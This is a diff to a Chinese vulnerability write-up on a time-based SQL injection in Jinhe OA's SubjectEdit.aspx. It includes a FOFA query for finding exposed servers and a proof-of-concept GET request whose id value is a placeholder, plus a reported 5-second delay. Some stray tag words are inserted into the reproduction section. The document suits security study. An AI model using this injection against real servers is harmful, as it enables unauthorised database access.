@@ -17,8 +17,6 @@ asset_dir: embedded-base64
 # fofa语法
 
 > app="金和网络-金和OA"
->
-> 数据管理
 
 # 漏洞分析
 
@@ -56,6 +54,14 @@ public static DataTable GetSubject(string id)
 
 # 漏洞复现
 
+深入探索
+
+编程
+
+计算机服务器
+
+网络
+
 ```
 GET /c6/Jhsoft.Web.accept/SubjectEdit.aspx/?id=SQLI_POC HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -65,4 +71,4 @@ Host: jhsoft.mrxn.net
 
 成功延时 5 秒
 
-网络
+数据管理
